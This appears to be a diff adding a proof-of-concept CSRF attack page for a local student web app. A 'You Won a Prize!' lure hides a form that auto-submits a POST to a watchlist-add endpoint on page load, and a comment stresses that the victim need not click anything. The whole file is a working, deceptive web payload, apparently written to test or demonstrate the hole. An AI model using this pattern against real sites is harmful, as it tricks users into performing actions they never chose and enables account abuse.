@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>You Won a Prize!</title>
+</head>
+<body>
+  <h1>Congratulations! Click below to claim your prize!</h1>
+  <img src="x" style="display:none">
+
+  <form id="csrfForm" 
+        action="http://localhost:3000/student/watchlist/add" 
+        method="POST">
+    <input type="hidden" name="proid" value="1">
+  </form>
+
+  <script>
+    // Auto-submit on page load — victim doesn't need to click anything
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
